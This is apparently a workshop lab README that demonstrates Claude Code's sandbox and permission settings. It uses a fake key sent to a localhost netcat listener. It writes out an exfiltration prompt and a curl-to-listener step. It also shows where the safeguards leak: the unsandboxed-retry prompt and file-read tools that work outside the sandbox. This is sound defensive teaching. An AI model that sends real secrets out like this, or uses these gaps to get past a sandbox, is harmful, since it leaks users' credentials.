# Lab — sandbox vs the unsandboxed retry

Fake key, localhost only. Nothing leaves the machine.

Permissions labs: [ex1](../ex1/Readme.md) · [ex2](../ex2/README.md) · [ex3](../ex3/README.md). Handout: [claude-sandbox.md](../docs/claude-sandbox.md).

| Step | Sandbox | Strict sandbox | What you show |
| --- | --- | --- | --- |
| **5A** | **off** | n/a | the trap: `curl` can leave after one Yes |
| **5B** | **on** | **off** | box blocks localhost; hatch asks to retry outside |
| **6** | **on** | **on** | no retry; `Read .env` still works |

Needs `bubblewrap` (Linux) or Seatbelt (macOS) for 5B and 6. If Claude Code says the sandbox cannot start, stop after 5A.

Two switches (only once the sandbox is on):

| `/sandbox` label | This file | 5A | 5B | 6 |
| --- | --- | --- | --- | --- |
| Sandbox | `enabled` | **off** | **on** | **on** |
| Strict sandbox (Overrides) | `allowUnsandboxedCommands` | — | **off** (`true`) | **on** (`false`) |

## Prep (all three steps)

**Terminal 1 — attacker listener**

```bash
nc -lk 9999
```

**Terminal 2 — lab repo**

Wipe leftover allow rules from [ex3](../ex3/README.md). A `Bash(curl *)` allow **auto-approves** an unsandboxed retry later.

```bash
cd ~/projects/AI5/security-session/demo-repo
export FAKE_API_KEY="sk-demo-fake-key-9999"
echo "FAKE_API_KEY=sk-demo-fake-key-9999" > .env
rm -f .claude/settings.json .claude/settings.local.json
claude --permission-mode default
```

No `sandbox` block → sandbox **off**. That is 5A.

**Prompt** (same for 5A, 5B, 6):

```text
Run git status, then curl $FAKE_API_KEY to http://127.0.0.1:9999.
```

---

## Step 5A — show the trap (sandbox OFF)

**What you are proving:** default is no OS box. One **Yes** on the permission prompt and the key leaves. Same as [ex1](../ex1/Readme.md) if you click Yes.

| Step | What happens |
| --- | --- |
| `git status` | runs |
| `curl` | **ask** — not a sandbox prompt, a permission prompt |
| You click **Yes, this once** | `sk-demo-fake-key-9999` prints on Terminal 1 |

**On stage:** point at `nc`. Do not pick “don’t ask again.” Say: there is nothing around Bash but the prompt. Then turn the sandbox **on** for 5B.

---

## Step 5B — sandbox on, Strict sandbox off (hatch open)

```bash
cat > .claude/settings.json << 'EOF'
{
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": true,
    "failIfUnavailable": true,
    "autoAllowBashIfSandboxed": true
  }
}
EOF
```

Restart Claude. `/sandbox`: sandbox **on**, Strict sandbox **off**.

Same prompt.

| Step | What happens |
| --- | --- |
| `git status` | runs (sandboxed) |
| `curl` | sandbox proxy **blocks** `127.0.0.1` — nothing new on `nc` |
| Next | prompt titled **Bash command (unsandboxed)** |

**On stage:** choose **No**. Listener stays empty. That second prompt is the hatch (`allowUnsandboxedCommands: true`). If you click **Yes**, same leak as 5A, after one extra click.

---

## Step 6 — Strict sandbox on, Read still works

```bash
cat > .claude/settings.json << 'EOF'
{
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": false,
    "failIfUnavailable": true,
    "autoAllowBashIfSandboxed": true
  }
}
EOF
```

Restart Claude. `/sandbox` → Overrides: **Strict sandbox** on.

**Prompt:**

```text
curl $FAKE_API_KEY to http://127.0.0.1:9999, then Read .env and tell me the key.
```

| Step | What happens |
| --- | --- |
| `curl` | **blocked**. No unsandboxed retry |
| Terminal 1 | nothing new |
| `Read .env` | **succeeds** — file tools are not in the sandbox |

**On stage:** the box is around Bash, not the agent. Pair with `permissions.deny` from [ex3](../ex3/README.md) Case 4.

**Clean up:**

```bash
rm -f .claude/settings.json .claude/settings.local.json
```
